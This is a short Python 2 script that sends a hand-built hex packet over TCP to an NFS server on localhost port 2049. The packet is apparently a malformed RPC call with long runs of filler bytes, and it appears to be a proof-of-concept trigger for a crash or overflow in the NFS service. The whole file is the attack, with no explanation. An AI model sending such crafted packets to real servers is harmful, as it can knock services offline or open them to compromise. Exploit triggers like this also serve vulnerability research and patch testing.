#!/usr/bin/env python2

from socket import *
import binascii

pkt="""
 80 00 00 94 00 0b f2 86 00 00 00 00 00 00 00 02
 00 01 86 a3 00 00 00 02 00 00 00 09 00 00 00 01
 00 00 00 02 00 00 00 00 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61
 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61
 00 01 86 a0 00 00 00 00 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00 61 61 61 61 61 61 61 61
 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61
 61 61 61 61 61 61 61 61
"""

host='localhost'
port=2049

sock=socket(AF_INET,SOCK_STREAM)
sock.connect((host,port))
for c in ['\r','\n',' ']:
	pkt = pkt.replace(c,'')
sock.sendall(binascii.unhexlify(pkt))
print 'sent'
sock.close()


